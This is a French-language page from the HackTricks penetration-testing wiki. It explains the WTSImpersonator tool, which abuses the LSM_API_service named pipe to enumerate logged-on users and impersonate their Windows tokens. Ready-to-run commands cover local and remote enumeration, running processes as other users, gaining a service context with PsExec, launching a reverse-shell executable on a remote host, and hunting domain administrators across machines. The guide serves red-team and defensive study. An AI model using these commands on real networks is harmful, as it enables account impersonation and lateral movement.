<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

L'outil **WTS Impersonator** exploite le Named pipe RPC **"\\pipe\LSM_API_service"** pour énumérer discrètement les utilisateurs connectés et usurper leurs jetons, contournant ainsi les techniques traditionnelles d'usurpation de jetons. Cette approche facilite les mouvements latéraux au sein des réseaux. L'innovation derrière cette technique est attribuée à **Omri Baso, dont le travail est accessible sur [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.

### Fonctionnalité principale
L'outil fonctionne à travers une séquence d'appels API :
```powershell
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Modules Clés et Utilisation
- **Énumération des Utilisateurs**: L'énumération des utilisateurs locaux et distants est possible avec l'outil, en utilisant des commandes pour chaque scénario :
- Localement :
```powershell
.\WTSImpersonator.exe -m enum
```
- À distance, en spécifiant une adresse IP ou un nom d'hôte :
```powershell
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Exécution de Commandes**: Les modules `exec` et `exec-remote` nécessitent un contexte de **Service** pour fonctionner. L'exécution locale nécessite simplement l'exécutable WTSImpersonator et une commande :
- Exemple d'exécution de commande locale :
```powershell
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec64.exe peut être utilisé pour obtenir un contexte de service :
```powershell
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Exécution de Commande à Distance**: Implique la création et l'installation d'un service à distance similaire à PsExec.exe, permettant l'exécution avec les autorisations appropriées.
- Exemple d'exécution à distance :
```powershell
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **Module de Recherche d'Utilisateurs**: Cible des utilisateurs spécifiques sur plusieurs machines, exécutant du code sous leurs identifiants. Cela est particulièrement utile pour cibler les administrateurs de domaine ayant des droits d'administration locaux sur plusieurs systèmes.
- Exemple d'utilisation :
```powershell
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```
